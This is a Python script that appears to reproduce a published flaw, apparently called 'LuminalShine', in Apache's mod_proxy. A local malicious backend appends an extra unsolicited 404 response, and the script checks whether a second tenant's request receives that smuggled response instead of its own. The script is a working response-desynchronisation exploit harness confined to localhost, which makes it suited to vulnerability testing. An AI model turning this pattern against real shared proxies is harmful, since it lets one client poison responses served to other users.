#!/usr/bin/env python3
"""Run the published LuminalShine malformed-response pattern through Apache."""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path


BODY = b'<?xml version="1.0" encoding="utf-8"?>\r\n<root status_code="404"/>'
EXTRA = b"HTTP/1.1 404 NOT FOUND\r\n" + BODY


def read_response(sock: socket.socket) -> bytes:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            return data
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length = next((int(line.split(b":", 1)[1]) for line in head.split(b"\r\n")
                   if line.lower().startswith(b"content-length:")), 0)
    while len(body) < length:
        chunk = sock.recv(8192)
        if not chunk:
            break
        body += chunk
    return head + b"\r\n\r\n" + body[:length]


class LuminalPatternBackend:
    def __init__(self, delay_ms: int):
        self.delay_ms = delay_ms
        self.listener = socket.socket()
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(4)
        self.port = self.listener.getsockname()[1]
        self.connections = 0

    @staticmethod
    def recv_headers(conn: socket.socket) -> bytes:
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = conn.recv(8192)
            if not chunk:
                return data
            data += chunk
        return data

    def serve_b(self, conn: socket.socket) -> None:
        conn.settimeout(1)
        request = self.recv_headers(conn)
        if request:
            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nREALB")

    def run(self) -> None:
        try:
            first, _ = self.listener.accept()
            self.connections += 1
            with first:
                request_a = self.recv_headers(first)
                if b"/unpair?uniqueid=" not in request_a:
                    raise AssertionError(f"unexpected A request: {request_a!r}")
                first.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: " +
                              str(len(BODY)).encode() + b"\r\n\r\n" + BODY)
                time.sleep(self.delay_ms / 1000)
                first.sendall(EXTRA)
                try:
                    self.serve_b(first)
                    return
                except (OSError, socket.timeout):
                    pass
            second, _ = self.listener.accept()
            self.connections += 1
            with second:
                self.serve_b(second)
        finally:
            self.listener.close()


def one_run(args: argparse.Namespace, delay_ms: int) -> bool:
    with tempfile.TemporaryDirectory(prefix="luminal-pattern-") as tmp:
        root = Path(tmp)
        backend = LuminalPatternBackend(delay_ms)
        config = root / "httpd.conf"
        config.write_text(f"""\
ServerRoot "{args.server_root}"
Listen 127.0.0.1:18080
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:{backend.port}/
ProxyPassReverse / http://127.0.0.1:{backend.port}/
""")
        thread = threading.Thread(target=backend.run, daemon=True)
        thread.start()
        apache = subprocess.Popen(
            [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={**os.environ, "APACHE_RUN_DIR": str(root)},
        )
        try:
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                try:
                    with socket.create_connection(("127.0.0.1", 18080), timeout=1):
                        break
                except OSError:
                    if apache.poll() is not None:
                        raise RuntimeError(apache.stderr.read())
            with socket.create_connection(("127.0.0.1", 18080), timeout=3) as attacker:
                attacker.sendall(b"GET /unpair?uniqueid=0123456789ABCDEF&uuid=00000000-0000-0000-0000-000000000000 HTTP/1.1\r\nHost: tenant-a\r\nConnection: keep-alive\r\n\r\n")
                response_a = read_response(attacker)
            with socket.create_connection(("127.0.0.1", 18080), timeout=3) as victim:
                victim.sendall(b"GET /tenant-b/normal HTTP/1.1\r\nHost: tenant-b\r\nConnection: close\r\n\r\n")
                response_b = read_response(victim)
            thread.join(timeout=2)
            contaminated = not response_b.endswith(b"REALB")
            print(f"luminalshine_delay_ms={delay_ms} backend_connections={backend.connections} b_contaminated={contaminated}")
            print(f"luminalshine_response_b={response_b!r}")
            if not response_a.endswith(BODY):
                raise AssertionError(f"unexpected A response: {response_a!r}")
            return contaminated
        finally:
            apache.terminate()
            try:
                apache.wait(timeout=3)
            except subprocess.TimeoutExpired:
                apache.kill()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--delays-ms", nargs="+", type=int, default=[0, 1, 5, 10, 25, 50, 80, 100])
    args = parser.parse_args()
    observed = any(one_run(args, delay) for delay in args.delays_ms)
    print("luminalshine_apache_boundary=observed" if observed else "luminalshine_apache_boundary=not_observed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
